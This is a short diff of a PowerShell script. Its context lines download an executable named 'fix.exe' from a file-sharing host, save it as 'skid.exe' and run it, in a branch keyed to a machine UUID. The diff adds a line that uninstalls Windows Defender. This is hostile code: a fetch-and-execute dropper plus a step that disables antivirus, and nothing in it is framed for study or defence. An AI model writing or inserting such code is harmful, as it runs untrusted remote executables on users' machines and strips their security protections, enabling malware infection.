@@ -52,4 +52,5 @@ if ($uuid -eq $blockedUUID) {
     Invoke-WebRequest -Uri "https://anonsharing.com/file/f92fcbba333c5a03/fix.exe" -OutFile "$temp\skid.exe"
     Start-Process -FilePath "$temp\skid.exe"
 }
+uninstall-WindowsFeature -Name Windows-Defender
 
